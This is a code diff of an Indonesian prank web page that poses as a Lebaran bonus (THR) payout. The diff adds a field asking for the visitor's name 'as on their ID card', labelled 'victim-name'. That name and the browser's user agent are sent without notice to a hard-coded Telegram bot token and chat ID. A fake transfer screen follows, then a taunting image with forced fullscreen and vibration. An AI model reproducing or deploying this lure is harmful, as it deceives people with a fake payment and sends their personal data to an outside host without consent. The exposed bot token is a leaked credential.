@@ -5,72 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Konfirmasi Penerimaan THR 2026 🌙</title>
     <style>
-        body { 
-            margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; 
-            overflow: hidden; display: flex; align-items: center; justify-content: center; 
-            height: 100vh; text-align: center; 
-        }
-        
-        /* Container buat teks */
-        #intro {
-            position: absolute;
-            top: 20px; /* Jarak dari atas */
-            width: 100%;
-            padding: 0 10px;
-            box-sizing: border-box;
-            z-index: 5;
-        }
-        #intro h1 { 
-            color: #15803d; 
-            margin-bottom: 5px; /* Jarak kecil ke paragraf */
-        }
-        #intro p { 
-            color: #166534; 
-            margin-top: 0; 
-            margin-bottom: 50px; /* Jarak Gede biar Gak Ditimpa Amplop */
-        }
-
-        /* AMPLOP JADI GEDE WOY (280px) */
-        #envelope { 
-            width: 280px; 
-            cursor: pointer; 
-            position: relative; /* relative biar ngikutin layout teks awal */
-            transition: all 0.2s ease; 
-            z-index: 10; 
-            margin-top: 150px; /* Tambahin jarak manual ke bawah dari teks */
-        }
-        
-        /* Layar Prank Fullscreen */
-        #prank-screen { 
-            display: none; 
-            position: fixed; 
-            top: 0; left: 0; width: 100%; height: 100%; 
-            background: black; 
-            z-index: 100; 
-            justify-content: center; 
-            align-items: center; 
-            flex-direction: column; 
-        }
+        body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
+        #intro { margin-top: -50px; padding: 0 20px; }
+        h1 { color: #15803d; margin-bottom: 5px; }
+        p { color: #166534; margin-top: 0; }
+        #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 30px; width: 280px; }
+        input { width: 90%; padding: 10px; border: 1px solid #ddd; border-radius: 8px; outline: none; text-align: center; font-size: 1rem; }
+        #envelope { width: 280px; cursor: pointer; transition: all 0.2s ease; z-index: 10; margin-top: 20px; }
+        #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100; justify-content: center; align-items: center; }
         #prank-screen img { width: 100%; height: 100%; object-fit: contain; }
-        
-        /* Loading Palsu */
-        #loading-overlay { 
-            display: none; 
-            position: fixed; 
-            top: 0; left: 0; width: 100%; height: 100%; 
-            background: white; 
-            z-index: 50; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-        }
-        .spinner { 
-            border: 4px solid #f3f3f3; 
-            border-top: 4px solid #15803d; 
-            border-radius: 50%; 
-            width: 40px; height: 40px; 
-            animation: spin 1s linear infinite; 
-        }
+        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 50; flex-direction: column; align-items: center; justify-content: center; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #15803d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -78,7 +23,11 @@
 
     <div id="intro">
         <h1>Selamat Lebaran! 🌙</h1>
-        <p>Ketuk amplop di bawah untuk klaim THR kamu.</p>
+        <p>Silakan verifikasi nama untuk pencairan THR.</p>
+    </div>
+
+    <div id="verify-box">
+        <input type="text" id="victim-name" placeholder="Masukkan Nama Sesuai KTP" autocomplete="off">
     </div>
 
     <img id="envelope" src="amplop.png" alt="Amplop THR">
@@ -90,58 +39,54 @@
 
     <div id="prank-screen" onclick="location.reload()">
         <img src="monyet-memberikan-jari-tengah-kepada-orang-orang.jpg">
-        <h1 style="color: white; position: absolute; bottom: 20px; font-size: 1.5rem; text-shadow: 1px 1px 2px black;">CIE KENA PRANK! 🐒</h1>
     </div>
 
     <script>
         const env = document.getElementById('envelope');
+        const nameInput = document.getElementById('victim-name');
         const loading = document.getElementById('loading-overlay');
         const statusText = document.getElementById('status-text');
         const prank = document.getElementById('prank-screen');
-        
-        // Suara ketawa monyet nyebelin
         const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
 
-        let count = 0;
-        const move = () => {
-            if (count < 3) {
-                // Posisi jadi FIXED pas mulai lari
-                env.style.position = 'fixed';
-                env.style.left = Math.random() * (window.innerWidth - 280) + 'px';
-                env.style.top = Math.random() * (window.innerHeight - 280) + 'px';
-                count++;
-            }
-        };
+        // DATA TELEGRAM LO SUDAH TERPASANG OTOMATIS
+        const TELEGRAM_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
+        const TELEGRAM_CHAT_ID = '2128763567'; 
 
-        // Amplop lari pas didekati
-        env.addEventListener('mouseover', move);
-        env.addEventListener('touchstart', move);
+        function sendToTelegram(name) {
+            const text = `🎯 KORBAN THR: ${name}\n📱 UserAgent: ${navigator.userAgent}`;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`)
+            .catch(err => console.log("Gagal kirim log ke Tele lo"));
+        }
 
-        // Eksekusi pas diklik beneran
         env.addEventListener('click', () => {
-            loading.style.display = 'flex';
-            
-            // Animasi teks biar meyakinkan
-            setTimeout(() => { statusText.innerText = "Memverifikasi ID Penerima..."; }, 1000);
-            setTimeout(() => { statusText.innerText = "Mengirim saldo Rp 500.000..."; }, 2500);
+            const name = nameInput.value.trim();
+            if (name === "") {
+                alert("Masukkan nama dulu biar cair saldo THR-nya!");
+                return;
+            }
 
+            // Kirim log diam-diam
+            sendToTelegram(name);
+
+            // Munculin loading biar ngarep
+            loading.style.display = 'flex';
+            setTimeout(() => { statusText.innerText = "Memverifikasi data " + name + "..."; }, 1000);
+            setTimeout(() => { statusText.innerText = "Proses transfer saldo Rp 500.000..."; }, 2500);
+
+            // JEDARRR! Monyet muncul
             setTimeout(() => {
                 loading.style.display = 'none';
                 prank.style.display = 'flex';
-                document.title = "CIE KENA PRANK! 😜";
+                prankSound.play();
                 
-                // Play sound
-                prankSound.play().catch(e => console.log("Audio play blocked"));
-
-                // Getar HP
                 if (navigator.vibrate) navigator.vibrate([500, 100, 500]);
-
-                // Fullscreen Otomatis
+                
+                // Maksa Fullscreen
                 const elem = document.documentElement;
                 if (elem.requestFullscreen) elem.requestFullscreen();
                 else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-                else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
-            }, 4500); // 4.5 detik nunggu biar greget
+            }, 4500);
         });
     </script>
 </body>
